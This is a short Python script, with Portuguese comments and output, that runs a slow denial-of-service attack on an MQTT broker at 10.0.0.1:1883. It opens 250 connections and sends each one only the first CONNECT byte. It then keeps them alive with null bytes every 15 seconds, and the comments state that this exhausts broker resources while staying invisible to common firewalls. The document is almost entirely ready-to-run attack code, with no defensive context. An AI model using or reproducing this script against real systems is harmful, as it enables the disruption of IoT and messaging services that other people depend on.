import socket
import time
import sys

def iniciar_ataque_lento(target_ip, target_port, num_conexoes=200):
    lista_sockets = []
    print(f"[*] Alvo definido: {target_ip}:{target_port}")
    print(f"[*] Estabelecendo {num_conexoes} conexões de baixa taxa (Slow DoS)...")

    for i in range(num_conexoes):
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((target_ip, target_port))
            
            # Envia apenas o byte inicial do protocolo MQTT (0x10 = CONNECT)
            # Mas NÃO envia o restante do cabeçalho, prendendo o socket do servidor
            s.send(b'\x10')
            
            lista_sockets.append(s)
            if (i + 1) % 20 == 0:
                print(f"[+] {i + 1} conexões ativas segurando recursos do Broker.")
        except socket.error:
            print(f"[-] Broker parou de aceitar conexões no índice {i}.")
            break
        time.sleep(0.05) # Delay curto para não gerar pico volumétrico

    print("[*] Conexões estabelecidas. Mantendo canais abertos em baixa taxa...")
    try:
        while True:
            for s in list(lista_sockets):
                try:
                    # Envia um byte nulo esporadicamente apenas para o Kernel não derrubar a conexão por timeout TCP
                    s.send(b'\x00')
                except socket.error:
                    lista_sockets.remove(s)
            time.sleep(15) # Janela longa (Baixa taxa / Invisível para firewalls comuns)
    except KeyboardInterrupt:
        print("\n[*] Encerrando ataque e liberando sockets.")
        for s in lista_sockets:
            s.close()

if __name__ == "__main__":
    iniciar_ataque_lento("10.0.0.1", 1883, num_conexoes=250)
